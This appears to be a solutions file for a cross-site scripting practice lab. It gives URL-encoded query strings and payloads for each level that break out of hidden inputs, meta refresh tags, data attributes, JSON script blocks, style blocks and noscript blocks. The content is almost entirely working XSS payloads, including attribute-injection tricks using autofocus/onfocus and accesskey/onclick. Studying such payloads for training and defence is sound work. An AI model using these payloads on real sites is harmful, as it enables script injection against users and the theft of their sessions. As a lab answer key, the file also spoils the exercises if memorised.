# hidden — solutions

Reflection in hidden / non-visible sinks: `<input type=hidden>`, meta refresh, data attributes, JSON/CSS/noscript blocks.

### hidden-reflection-level1

`/hidden-reflection/level1/?query=%22%20type=text%20autofocus%20onfocus=alert(1)%20x=%22`

- payload: `" type=text autofocus onfocus=alert(1) x="`
- context: `<input type="hidden" value="...">` — override type so autofocus/onfocus fires

### hidden-xss-level1

`/hidden/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<input type="hidden" value="...">` — raw, break out and inject

### hidden-reflection-level2

`/hidden-reflection/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: meta refresh `content="0;url=..."`; javascript: refresh is blocked, so break out

### hidden-xss-level2

`/hidden/level2/?query=%22%20accesskey=%22x%22%20onclick=%22alert(1)%22%20x=%22`

- payload: `" accesskey="x" onclick="alert(1)" x="`
- context: type="hidden" wins over an injected type, so it never focuses; accesskey + onclick fires on Alt+Shift+X (Firefox)

### hidden-reflection-level3

`/hidden-reflection/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<img data-original="...">` — break out of attribute

### hidden-xss-level3

`/hidden/level3/?query=%22/accesskey=%22x%22/onclick=%22alert(1)%22/x=%22`

- payload: `"/accesskey="x"/onclick="alert(1)"/x="`
- context: as level2 with spaces stripped; quote each value so `/` can separate the attributes

### hidden-reflection-level4

`/hidden-reflection/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: inside `<script type="application/json">`; close script and start a new one

### hidden-reflection-level5

`/hidden-reflection/level5/?query=red%7D%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `red}</style><script>alert(1)</script>`
- context: inside `<style>` block; close style then inject

### hidden-reflection-level6

`/hidden-reflection/level6/?query=%3C/noscript%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</noscript><script>alert(1)</script>`
- context: inside `<noscript>`; close it then inject
